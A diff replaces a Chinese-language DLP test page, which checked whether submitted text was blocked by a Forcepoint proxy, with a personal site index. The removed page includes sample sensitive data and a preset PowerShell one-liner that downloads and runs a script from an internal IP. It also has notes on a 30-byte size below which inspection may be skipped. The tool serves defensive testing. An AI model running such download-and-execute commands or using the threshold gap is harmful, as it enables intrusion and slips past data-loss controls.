@@ -3,262 +3,49 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DLP Test Echo</title>
+<title>kevinkou — 測試站</title>
 <style>
-  body { font-family: Arial, Tahoma, Verdana, sans-serif; max-width: 720px; margin: 40px auto; padding: 0 20px; color: #222; }
-  h1 { font-size: 20px; }
-  h2 { font-size: 15px; margin-top: 32px; border-top: 1px solid #eee; padding-top: 20px; }
-  textarea { width: 100%; height: 120px; font-family: monospace; font-size: 14px; box-sizing: border-box; }
-  input[type=file] { margin-top: 8px; }
-  input[type=number] { width: 60px; font-size: 14px; padding: 4px; }
-  button { padding: 8px 20px; font-size: 14px; cursor: pointer; margin: 4px 4px 4px 0; }
-  button.preset { background: #eef2f7; border: 1px solid #cdd8e3; border-radius: 4px; font-size: 12px; padding: 6px 12px; }
-  button.preset:hover { background: #dde8f2; }
-  #byteCounter { font-family: monospace; font-size: 12px; color: #666; margin-top: 4px; }
-  #byteCounter.warn { color: #b3261e; font-weight: bold; }
-  #result { margin-top: 20px; display: none; }
-  #status { padding: 8px 12px; font-family: monospace; font-size: 13px; font-weight: bold; }
-  #status.ok { background: #e6f4ea; color: #1e7e34; border: 1px solid #b7dfc0; }
-  #status.blocked { background: #fdecea; color: #b3261e; border: 1px solid #f3b4ae; }
-  #status.other { background: #fff4e5; color: #8a5300; border: 1px solid #f0d4a3; }
-  #jsonBox { margin-top: 8px; padding: 12px; background: #f4f4f4; border: 1px solid #ddd; white-space: pre-wrap; word-break: break-all; font-family: monospace; font-size: 13px; }
-  #headersBox { margin-top: 8px; padding: 12px; background: #fbfbfb; border: 1px solid #e5e5e5; font-family: monospace; font-size: 12px; display: none; }
-  #headersBox summary { cursor: pointer; font-weight: bold; color: #444; }
-  #headersBox table { width: 100%; margin-top: 8px; border-collapse: collapse; }
-  #headersBox td { padding: 2px 6px; vertical-align: top; word-break: break-all; }
-  #headersBox td.key { color: #555; white-space: nowrap; width: 1%; }
-  #htmlFrame { margin-top: 8px; width: 100%; min-width: 610px; height: 500px; border: 1px solid #ddd; }
-  .note { color: #777; font-size: 12px; margin-top: 8px; }
-  table.history { width: 100%; border-collapse: collapse; margin-top: 12px; font-size: 12px; }
-  table.history th, table.history td { border: 1px solid #ddd; padding: 6px 8px; text-align: left; vertical-align: top; }
-  table.history th { background: #f4f4f4; }
-  table.history td.preview { max-width: 260px; word-break: break-all; font-family: monospace; }
-  .tag { display: inline-block; padding: 2px 8px; border-radius: 3px; font-weight: bold; font-size: 11px; }
-  .tag.ok { background: #e6f4ea; color: #1e7e34; }
-  .tag.blocked { background: #fdecea; color: #b3261e; }
-  .tag.other { background: #fff4e5; color: #8a5300; }
-  .batchRow { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-top: 8px; }
-  #batchProgress { font-family: monospace; font-size: 12px; color: #666; margin-top: 8px; display: none; }
+  :root { --ink:#1d242b; --sub:#5a6068; --line:#e5e3de; --accent:#007465; --bg:#f7f6f3; }
+  * { box-sizing:border-box; }
+  body { margin:0; font-family:"Noto Sans TC",system-ui,-apple-system,sans-serif;
+         background:var(--bg); color:var(--ink); line-height:1.6; }
+  .wrap { max-width:680px; margin:0 auto; padding:64px 24px 80px; }
+  header h1 { font-size:26px; margin:0 0 6px; letter-spacing:-.01em; }
+  header p { color:var(--sub); font-size:14px; margin:0 0 40px; }
+  h2 { font-size:12px; letter-spacing:.16em; color:var(--sub); font-weight:700;
+       border-bottom:1px solid var(--line); padding-bottom:8px; margin:36px 0 6px; }
+  ul { list-style:none; margin:0; padding:0; }
+  li a { display:flex; align-items:baseline; gap:12px; text-decoration:none; color:inherit;
+         padding:14px 4px; border-bottom:1px solid var(--line); transition:padding-left .12s; }
+  li a:hover { padding-left:10px; background:#fff; }
+  .name { font-size:16px; font-weight:600; }
+  .path { font-family:ui-monospace,Menlo,monospace; font-size:12px; color:var(--accent); }
+  .desc { color:var(--sub); font-size:13px; margin-left:auto; text-align:right; }
+  footer { margin-top:56px; color:var(--sub); font-size:12px; }
 </style>
 </head>
 <body>
-<h1>DLP Test Echo</h1>
-<p>純測試用：送出的文字/檔案只會被即時回顯位元組數，不會被儲存。所有測試紀錄只存在這個瀏覽器分頁裡，重新整理就會清空。</p>
+  <div class="wrap">
+    <header>
+      <h1>kevinkou 測試站</h1>
+      <p>個人測試與小工具集合 · <span class="path">kevinkou.netlify.app</span></p>
+    </header>
 
-<form id="f">
-  <label>文字內容</label>
-  <textarea name="text" id="text"></textarea>
-  <div id="byteCounter">0 bytes</div>
+    <h2>頁面</h2>
+    <ul>
+      <li><a href="/dlptest/">
+        <span class="name">DLP Test Echo</span>
+        <span class="path">/dlptest</span>
+        <span class="desc">文字／檔案上傳回顯，含完整 HTTP header</span>
+      </a></li>
+      <li><a href="/pat/">
+        <span class="name">照片桌寵</span>
+        <span class="path">/pat</span>
+        <span class="desc">上傳照片變成會動的桌面寵物</span>
+      </a></li>
+    </ul>
 
-  <div>
-    <button type="button" class="preset" data-fill="身分證字號A123456789姓名王小明">身分證字號＋姓名</button>
-    <button type="button" class="preset" data-fill="IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')">可疑PowerShell片段</button>
-    <button type="button" class="preset" data-fill="信用卡卡號 4111 1111 1111 1111 有效期限 12/28">信用卡卡號</button>
-    <button type="button" class="preset" data-len="29">通用內容 29 bytes（剛好低於30門檻）</button>
-    <button type="button" class="preset" data-len="31">通用內容 31 bytes（剛好高於30門檻）</button>
-    <button type="button" class="preset" data-fill="">清空</button>
+    <footer>此為個人測試網站，內容隨時可能變動。</footer>
   </div>
-
-  <br>
-  <label>檔案（可選）</label><br>
-  <input type="file" name="file" id="file">
-  <br>
-  <button type="submit">送出</button>
-</form>
-
-<div id="result">
-  <div id="status"></div>
-  <details id="headersBox">
-    <summary>完整回應標頭（Response Headers）</summary>
-    <table id="headersTable"></table>
-  </details>
-  <div id="jsonBox" style="display:none;"></div>
-  <iframe id="htmlFrame" style="display:none;"></iframe>
-</div>
-
-<h2>連續送出（測試累計/Drip DLP偵測）</h2>
-<p class="note">用上方文字內容連續送出N次，中間間隔可調整。適合demo「單次不擋、累計到門檻才擋」的情境，或FSM Severity &amp; Action裡設定的Accumulate matches效果。</p>
-<div class="batchRow">
-  送出次數 <input type="number" id="batchCount" value="5" min="1" max="50">
-  間隔(毫秒) <input type="number" id="batchDelay" value="1000" min="0" max="60000" step="100">
-  <button type="button" id="batchStart">開始連續送出</button>
-  <button type="button" id="batchStop" disabled>停止</button>
-</div>
-<div id="batchProgress"></div>
-
-<h2>本次測試紀錄</h2>
-<table class="history" id="historyTable">
-  <thead>
-    <tr><th>時間</th><th>Bytes</th><th>結果</th><th>內容預覽</th></tr>
-  </thead>
-  <tbody id="historyBody"></tbody>
-</table>
-
-<p class="note">Client IP不記錄、內容不落地存檔，收到後只回傳大小資訊。</p>
-
-<script>
-const textEl = document.getElementById('text');
-const byteCounterEl = document.getElementById('byteCounter');
-const historyBody = document.getElementById('historyBody');
-
-function utf8ByteLength(str) {
-  return new Blob([str]).size;
-}
-
-function updateByteCounter() {
-  const n = utf8ByteLength(textEl.value);
-  byteCounterEl.textContent = n + ' bytes' + (n < 30 ? '（低於Protector最小交易門檻30 bytes，實測可能被跳過檢查）' : '');
-  byteCounterEl.className = n < 30 ? 'warn' : '';
-}
-textEl.addEventListener('input', updateByteCounter);
-updateByteCounter();
-
-function makeFillerOfLength(n) {
-  const prefix = 'test-';
-  if (n <= prefix.length) return 'x'.repeat(n);
-  return prefix + 'x'.repeat(n - prefix.length);
-}
-
-document.querySelectorAll('button.preset').forEach(btn => {
-  btn.addEventListener('click', () => {
-    if (btn.dataset.len) {
-      textEl.value = makeFillerOfLength(parseInt(btn.dataset.len, 10));
-    } else {
-      textEl.value = btn.dataset.fill || '';
-    }
-    updateByteCounter();
-  });
-});
-
-function addHistoryRow(size, tagClass, tagText, preview) {
-  const tr = document.createElement('tr');
-  const time = new Date().toLocaleTimeString('zh-TW', { hour12: false });
-  tr.innerHTML = `<td>${time}</td><td>${size}</td><td><span class="tag ${tagClass}">${tagText}</span></td><td class="preview"></td>`;
-  tr.querySelector('.preview').textContent = preview.slice(0, 120);
-  historyBody.prepend(tr);
-}
-
-function renderHeaders(res) {
-  const table = document.getElementById('headersTable');
-  const box = document.getElementById('headersBox');
-  table.innerHTML = '';
-  const rows = [[`(status line)`, `HTTP ${res.status} ${res.statusText}`]];
-  res.headers.forEach((value, key) => rows.push([key, value]));
-  rows.forEach(([k, v]) => {
-    const tr = document.createElement('tr');
-    tr.innerHTML = `<td class="key"></td><td></td>`;
-    tr.children[0].textContent = k;
-    tr.children[1].textContent = v;
-    table.appendChild(tr);
-  });
-  box.style.display = 'block';
-}
-
-async function sendOnce(fd, textPreview, sizeOverride) {
-  const res = await fetch('/api/echo', { method: 'POST', body: fd });
-  const raw = await res.text();
-  let parsed = null;
-  try { parsed = JSON.parse(raw); } catch (_) {}
-
-  let tagClass, tagText, statusMsg, showJson = false, showHtml = false;
-
-  if (res.ok && parsed) {
-    tagClass = 'ok'; tagText = '放行';
-    statusMsg = `HTTP ${res.status}：放行，後端已收到`;
-    showJson = true;
-  } else if (raw.trim().startsWith('<')) {
-    const looksBlocked = /forcepoint|blocked for your protection|access to this site is blocked/i.test(raw);
-    tagClass = looksBlocked ? 'blocked' : 'other';
-    tagText = looksBlocked ? '被擋下' : '非預期回應';
-    statusMsg = looksBlocked
-      ? `HTTP ${res.status}：內容被DLP擋下（未送達後端）`
-      : `HTTP ${res.status}：非預期回應（不是DLP擋下，也不是正常JSON，可能是伺服器錯誤）`;
-    showHtml = true;
-  } else {
-    tagClass = 'other'; tagText = '非預期回應';
-    statusMsg = `HTTP ${res.status}：非預期回應`;
-    showJson = true;
-  }
-
-  const size = sizeOverride != null ? sizeOverride : utf8ByteLength(textPreview);
-  addHistoryRow(size, tagClass, tagText, textPreview);
-
-  return { res, raw, parsed, tagClass, tagText, statusMsg, showJson, showHtml };
-}
-
-document.getElementById('f').addEventListener('submit', async function (e) {
-  e.preventDefault();
-  const fd = new FormData(this);
-  const resultEl = document.getElementById('result');
-  const statusEl = document.getElementById('status');
-  const jsonBox = document.getElementById('jsonBox');
-  const htmlFrame = document.getElementById('htmlFrame');
-
-  resultEl.style.display = 'block';
-  jsonBox.style.display = 'none';
-  htmlFrame.style.display = 'none';
-  document.getElementById('headersBox').style.display = 'none';
-  statusEl.className = '';
-  statusEl.textContent = '送出中...';
-
-  try {
-    const r = await sendOnce(fd, textEl.value);
-    statusEl.className = r.tagClass === 'ok' ? 'ok' : (r.tagClass === 'blocked' ? 'blocked' : 'other');
-    statusEl.textContent = r.statusMsg;
-    renderHeaders(r.res);
-    if (r.showJson) {
-      jsonBox.style.display = 'block';
-      jsonBox.textContent = JSON.stringify(r.parsed ?? r.raw, null, 2);
-    }
-    if (r.showHtml) {
-      htmlFrame.style.display = 'block';
-      htmlFrame.srcdoc = r.raw;
-    }
-  } catch (err) {
-    statusEl.className = 'other';
-    statusEl.textContent = '網路層級錯誤: ' + err.message;
-  }
-});
-
-let batchStopFlag = false;
-document.getElementById('batchStart').addEventListener('click', async () => {
-  const count = parseInt(document.getElementById('batchCount').value, 10) || 1;
-  const delay = parseInt(document.getElementById('batchDelay').value, 10) || 0;
-  const text = textEl.value;
-  if (!text) { alert('請先在上方文字內容欄位填入要連續送出的內容'); return; }
-
-  batchStopFlag = false;
-  document.getElementById('batchStart').disabled = true;
-  document.getElementById('batchStop').disabled = false;
-  const progressEl = document.getElementById('batchProgress');
-  progressEl.style.display = 'block';
-
-  for (let i = 1; i <= count; i++) {
-    if (batchStopFlag) { progressEl.textContent = `已在第 ${i - 1} 次手動停止`; break; }
-    progressEl.textContent = `送出中... ${i}/${count}`;
-    const fd = new FormData();
-    fd.append('text', text);
-    try {
-      const r = await sendOnce(fd, text);
-      progressEl.textContent = `第 ${i}/${count} 次：${r.tagText}`;
-      if (r.tagClass === 'blocked') {
-        progressEl.textContent += ' ← 累計達門檻，開始被擋';
-      }
-    } catch (err) {
-      progressEl.textContent = `第 ${i}/${count} 次發生錯誤：${err.message}`;
-    }
-    if (i < count && !batchStopFlag) {
-      await new Promise(r => setTimeout(r, delay));
-    }
-  }
-
-  document.getElementById('batchStart').disabled = false;
-  document.getElementById('batchStop').disabled = true;
-});
-
-document.getElementById('batchStop').addEventListener('click', () => {
-  batchStopFlag = true;
-});
-</script>
 </body>
 </html>
